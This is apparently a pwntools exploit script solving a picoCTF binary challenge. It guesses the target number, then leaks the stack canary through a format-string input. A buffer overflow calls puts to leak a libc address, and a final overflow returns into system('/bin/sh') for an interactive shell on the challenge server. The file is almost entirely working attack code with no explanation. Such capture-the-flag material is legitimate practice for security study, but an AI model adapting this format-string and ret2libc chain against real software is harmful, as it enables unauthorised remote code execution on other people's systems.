#!/usr/bin/env python3

from pwn import *
from struct import pack
exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 13775)

    return r


context.binary = exe
def main():
	
	# def findGuessingNumber():
	# 	for i in range(-4095, 4097):
	# 		r = conn()
	# 		r.recvuntil(b'guess?\n')
	# 		r.sendline(str(i + 1).encode())
	# 		res = r.recvline(3)
	# 		if b'Nope' in res:
	# 			r.close()
	# 			continue
	# 		else:
	# 			info(b'Find a number: ' + str(i + 1).encode()) 
	# 			# On old binary: -415, on new binary/server: -3727
	# 			r.close()
	# 			break
	# findGuessingNumber()
	# Leaking libc address
	r = conn()
	input()
	# Leaking canary
	r.sendlineafter(b'guess?\n', b'-3727')
	# r.sendlineafter(b'guess?\n', b'-415')
	r.sendlineafter(b'Name? ', b'%135$p')	# Offset: 512
	r.recvuntil(b'Congrats: ')
	canary = int(r.recv(10).decode(),16)
	info(b'Canary: ' + hex(canary).encode())
	pause()
	
	# Offset $ebp = 524
	# Leaking libc address: 
	payload = b'A'*512 + p32(canary) + b'A'*12 + p32(exe.plt['puts']) \
		+ p32(exe.sym['main'])+ p32(exe.got['puts']) 

	r.sendlineafter(b'guess?\n', b'-3727')
	# r.sendlineafter(b'guess?\n', b'-415')
	r.sendlineafter(b'Name? ',payload)
	pause()
	r.recvlines(2)
	# r.recvuntil(b'Congrats: ')
	libc_leak = u32(r.recv(4))
	libc.address = libc_leak - libc.sym['puts']
	system = libc.sym['system']
	info(b'Libc leak address: ' + hex(libc_leak).encode())
	info(b'Libc base address: ' + hex(libc.address).encode())
	info(b'System address: ' + hex(system).encode())

	# Get shell
	# pop_edi_ebp = 0x080488fa
	payload = b'A'*512 + p32(canary) + b'A'*12 + p32(system) + p32(exe.sym['main']) + p32(next(libc.search(b'/bin/sh'))) 

	r.sendlineafter(b'guess?\n', b'-3727')
	# r.sendlineafter(b'guess?\n', b'-415')
	r.sendlineafter(b'Name? ',payload)
	
	r.recvuntil(b'Congrats: ')
	
	
	pause()
	r.interactive()

if __name__ == "__main__":
    main()
